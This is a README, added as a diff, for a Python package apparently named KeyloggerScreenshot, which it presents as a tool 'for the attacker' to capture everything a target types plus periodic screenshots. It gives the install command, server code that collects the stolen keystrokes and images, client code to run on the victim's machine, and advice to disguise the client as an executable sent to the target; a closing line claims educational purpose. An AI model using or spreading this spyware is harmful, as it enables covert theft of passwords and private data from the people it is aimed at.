@@ -1,0 +1,54 @@
+KeyloggerScreenshot
+===================
+
+Created by: Fawaz Bashiru
+KeyloggerScreenshot allows the attacker to get all the information the target was typing and a screenshot of a specific minutes which is being calculated in the script
+
+To install KeyloggerScreenshot simply type:
+
+`pip install KeyloggerScreenshot`
+
+In your terminal
+
+HOW DOES KeyloggerScreenshot WORK?
+==================================
+
+This module can be used in Windows and Linux
+The attacker should have two different servers on different files. The ip can be the same but the port number should be distinguished
+
+For example:
+
+Servers
+------
+```python
+#server_photos.py:
+ip, port = "127.0.0.1", 1234
+server_photos = ServerPhotos(ip, port)
+server_photos.start()
+
+#server_keylogger.py:
+ip, port = "127.0.0.1",5678
+server_keylogger = ServerKeylogger(ip, port)
+server_keylogger.start()
+
+```
+
+"server_photos.py" will get all the screenshots and "server_keylogger.py" will get everything the target has typed
+
+Client_Target
+-------------
+```python
+#client_target.py
+key_client = KeyloggerTarget("127.0.0.1", 1234, "127.0.0.1",5678, duration_in_seconds=300)
+key_client.start()
+
+```
+
+Additional
+==========
+* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"
+
+* KeyloggerScreenshot is very easy to use.
+
+* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.
+
